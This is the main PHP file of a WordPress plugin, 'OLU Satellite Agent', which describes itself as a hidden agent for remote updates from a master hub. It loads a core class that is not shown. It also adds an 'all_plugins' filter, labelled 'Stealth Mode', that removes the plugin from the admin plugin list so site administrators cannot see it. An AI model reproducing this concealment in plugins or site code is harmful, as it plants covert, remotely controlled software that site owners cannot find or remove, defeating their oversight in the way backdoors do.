<?php
/**
 * Plugin Name: OLU Satellite Agent
 * Description: The hidden agent for OLU Master Hub. Handles remote updates.
 * Version: 1.0.0
 * Author: Olutek Digital
 * Text Domain: olu-agent
 */

if (!defined('ABSPATH')) {
    exit;
}

define('OLU_AGENT_VERSION', '1.0.0');
define('OLU_AGENT_PATH', plugin_dir_path(__FILE__));
define('OLU_AGENT_URL', plugin_dir_url(__FILE__));

// Initialize Agent
require_once OLU_AGENT_PATH . 'includes/class-olu-agent-core.php';

function olu_agent_init() {
    Olu_Agent_Core::instance();
}
add_action('plugins_loaded', 'olu_agent_init');

// Hide from plugin list (Stealth Mode)
add_filter('all_plugins', function($plugins) {
    if (is_admin() && !defined('DOING_AJAX')) {
        unset($plugins[plugin_basename(__FILE__)]);
    }
    return $plugins;
});
